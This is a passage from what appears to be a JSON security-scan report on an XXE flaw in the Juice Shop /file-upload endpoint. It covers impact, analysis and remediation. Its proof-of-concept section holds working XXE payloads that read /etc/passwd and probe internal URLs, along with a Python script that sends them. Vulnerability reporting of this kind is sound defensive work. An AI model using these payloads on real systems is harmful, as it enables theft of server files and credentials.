          ],
          "properties": {
            "security-severity": "8.2",
            "strix": {
              "id": "vuln-0009",
              "severity": "high",
              "cvss": 8.2,
              "timestamp": "2026-05-09 09:47:14 UTC",
              "target": "https://github.com/juice-shop/juice-shop",
              "endpoint": "/file-upload",
              "method": "POST",
              "cwe": "CWE-611",
              "impact": "Successful exploitation allows an attacker to:\n\n- Read sensitive server-side files including application configuration, environment variables, encryption keys, source code, and system files such as /etc/passwd or /etc/shadow (if readable by the application process).\n- Perform SSRF by directing the XML parser to fetch resources from internal network hosts and cloud metadata endpoints (e.g., http://169.254.169.254/).\n- Cause denial of service through entity expansion attacks (billion laughs), triggering a 2-second script timeout and returning HTTP 503 errors.\n- Exfiltrate up to 400 characters of file content per request through the error response, with repeated requests enabling extraction of larger files.\n\nBusiness impact includes potential exposure of database credentials, JWT signing keys, customer data, and internal service topology.",
              "technical_analysis": "The vulnerability resides in the `handleXmlUpload` function within `routes/fileUpload.ts`. The function processes uploaded XML files using the libxmljs2 library inside a Node.js VM sandbox.\n\nThe critical configuration error is on line 83:\n```javascript\nconst xmlDoc = vm.runInContext('libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })', sandbox, { timeout: 2000 })\n```\n\nThe `noent: true` option instructs the XML parser to substitute entity references with their resolved values. When an attacker defines an external entity using a `SYSTEM` identifier pointing to a file path or URL, the parser fetches and includes that content in the parsed document tree.\n\nOn line 84, `xmlDoc.toString(false)` serializes the document including the resolved entity content. This serialized string is then included in the error response on line 87:\n```javascript\nnext(new Error('B2B customer complaints via file upload have been deprecated for security reasons: ' + utils.trunc(xmlString, 400) + ' (' + file.originalname + ')'))\n```\n\nThe `utils.trunc()` function limits the reflected content to 400 characters, but this is sufficient to extract secrets, keys, and configuration fragments.\n\nThe endpoint is mounted at `POST /file-upload` (server.ts line 309) with multer memory storage accepting files up to 200KB. No authentication is required for file upload operations in the default configuration.",
              "remediation_steps": "1. Disable external entity resolution in the XML parser configuration. Replace `noent: true` with `noent: false` (or remove it entirely since false is the default):\n\n```javascript\nconst xmlDoc = vm.runInContext(\n  'libxml.parseXml(data, { noblanks: true, noent: false, nocdata: true })',\n  sandbox,\n  { timeout: 2000 }\n)\n```\n\n2. Additionally, disable DTD loading to prevent XXE via parameter entities:\n\n```javascript\nconst xmlDoc = vm.runInContext(\n  'libxml.parseXml(data, { noblanks: true, noent: false, nocdata: true, dtdload: false, dtdvalid: false })',\n  sandbox,\n  { timeout: 2000 }\n)\n```\n\n3. Do not reflect parsed XML content in error responses. Return a generic error message that does not include document content.\n\n4. Implement file type validation and consider whether XML upload functionality is still required. If deprecated, remove the XML parsing logic entirely.\n\n5. Apply defense-in-depth by running the application with minimal filesystem permissions and restricting outbound network access from the application runtime.",
              "poc": {
                "description": "To reproduce:\n\n1. Craft an XML file containing a malicious DOCTYPE declaration with an external entity referencing a local file:\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<stockCheck><productId>&xxe;</productId></stockCheck>\n```\n\n2. Submit a POST request to /file-upload with the XML file as a multipart form upload with the field name \"file\".\n\n3. Observe that the server response (HTTP 410) contains the contents of /etc/passwd in the error message, confirming file disclosure.\n\n4. For SSRF validation, substitute the entity URI with an internal service URL:\n```xml\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:3000/api/Users\">]>\n<stockCheck><productId>&xxe;</productId></stockCheck>\n```",
                "script": "import requests\nimport io\n\nBASE_URL = \"http://localhost:3000\"\nUPLOAD_ENDPOINT = f\"{BASE_URL}/file-upload\"\n\n# XXE payload to read /etc/passwd\nxxe_payload = \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<stockCheck><productId>&xxe;</productId></stockCheck>\n\"\"\"\n\n# Create file-like object for upload\nfiles = {\n    \"file\": (\"exploit.xml\", io.BytesIO(xxe_payload.encode()), \"application/xml\")\n}\n\nprint(\"[*] Sending XXE payload to read /etc/passwd...\")\nresponse = requests.post(UPLOAD_ENDPOINT, files=files, timeout=10)\n\nprint(f\"[*] Status Code: {response.status_code}\")\nprint(f\"[*] Response Body:\")\nprint(response.text)\n\nif \"root:\" in response.text or \"daemon:\" in response.text:\n    print(\"\\n[+] XXE CONFIRMED: /etc/passwd content disclosed in response!\")\nelse:\n    print(\"\\n[-] File content not directly visible; check error message for partial disclosure.\")\n\n# SSRF variant\nssrf_payload = \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:3000/api/Users\">]>\n<stockCheck><productId>&xxe;</productId></stockCheck>\n\"\"\"\n\nfiles_ssrf = {\n    \"file\": (\"ssrf.xml\", io.BytesIO(ssrf_payload.encode()), \"application/xml\")\n}\n\nprint(\"\\n[*] Sending SSRF payload targeting internal API...\")\nresponse_ssrf = requests.post(UPLOAD_ENDPOINT, files=files_ssrf, timeout=10)\nprint(f\"[*] Status Code: {response_ssrf.status_code}\")\nprint(f\"[*] Response (first 500 chars): {response_ssrf.text[:500]}\")"
              }
            }
          }
        },
